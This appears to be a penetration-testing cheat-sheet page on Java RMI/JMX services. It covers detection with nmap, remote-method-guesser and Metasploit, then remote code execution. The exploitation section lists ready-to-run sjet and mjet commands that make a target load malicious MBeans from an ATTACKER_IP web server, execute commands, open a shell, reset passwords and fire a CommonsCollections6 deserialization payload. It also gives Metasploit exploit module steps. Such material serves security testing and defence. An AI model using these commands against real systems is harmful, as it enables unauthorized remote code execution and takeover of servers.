# Java RMI

> Exposing a weak configured Java Remote Method Invocation (RMI) service can lead to several ways to achieve RCE.
> One such attack is to host an MLet file and instruct the JMX service to load MBeans from the remote host which can be carried out
> using the tools mjet or sjet. remote-method-guesser is a more recent tool which bundles enumeration of RMI services together
> with a summary of currently known attack techniques.

## Summary

* [Tools](#tools)
* [Detection](#detection)
* [Exploitation](#exploitation)
  * [RCE using sjet/mjet](#rce-using-sjet-or-mjet)
* [References](#references)

## Tools

- [sjet](https://github.com/siberas/sjet)
- [mjet](https://github.com/mogwailabs/mjet)
- [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

## Detection

Using [nmap](https://nmap.org/):
```powershell
$ nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
1089/tcp open  java-rmi Java RMI
| rmi-vuln-classloader:
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
| rmi-dumpregistry:
|   jmxrmi
|     javax.management.remote.rmi.RMIServerImpl_Stub
```

Using [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser):
```bash
$ rmg scan 172.17.0.2 --ports 0-65535
[+] Scanning 6225 Ports on 172.17.0.2 for RMI services.
[+]
[+] 	[HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)
[+] 	[HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)
[+] 	[HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)
[+] 	[6234 / 6234] [#############################] 100%
[+]
[+] Portscan finished.
```

```bash
$ rmg enum 172.17.0.2 9010
[+] RMI registry bound names:
[+]
[+] 	- plain-server2
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]
[+] 	- legacy-service
[+] 		--> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]
[+] 	- plain-server
[+] 		--> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)
[+] 		    Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]
[...]
```

Using Metasploit
```bash
use auxiliary/scanner/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
run
```

## Exploitation

### RCE using sjet or mjet

#### Requirements
- Jython
- The JMX server can connect to a http service that is controlled by the attacker
- JMX authentication is not enabled

#### Remote Command Execution

The attack involves the following steps:
* Starting a web server that hosts the MLet and a JAR file with the malicious MBeans
* Creating a instance of the MBean javax.management.loading.MLet on the target server, using JMX
* Invoking the "getMBeansFromURL" method of the MBean instance, passing the webserver URL as parameter. The JMX service will connect to the http server and parse the MLet file.
* The JMX service downloads and loades the JAR files that were referenced in the MLet file, making the malicious MBean available over JMX.
* The attacker finally invokes methods from the malicious MBean.

Exploit the JMX using [sjet](https://github.com/siberas/sjet) or [mjet](https://github.com/mogwailabs/mjet)

```powershell
jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
jython sjet.py TARGET_IP TARGET_PORT super_secret shell
jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password
jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall
jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 "touch /tmp/xxx"

jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000
jython mjet.py TARGET_IP TARGET_PORT command super_secret "whoami"
jython mjet.py TARGET_IP TARGET_PORT command super_secret shell
```

### RCE using Metasploit
```bash
use exploit/multi/misc/java_rmi_server
set RHOSTS <IPs>
set RPORT <PORT>
# configure also the payload if needed
run
```

## References

* [ATTACKING RMI BASED JMX SERVICES - HANS-MARTIN MÜNCH, 28 April 2019](https://mogwailabs.de/en/blog/2019/04/attacking-rmi-based-jmx-services/)
* [JMX RMI – MULTIPLE APPLICATIONS RCE - Red Timmy Security, 26 March 2019](https://www.exploit-db.com/docs/english/46607-jmx-rmi-–-multiple-applications-remote-code-execution.pdf)
* [remote-method-guesser - BHUSA 2021 Arsenal - Tobias Neitzel, 15 August 2021](https://www.slideshare.net/TobiasNeitzel/remotemethodguesser-bhusa2021-arsenal)
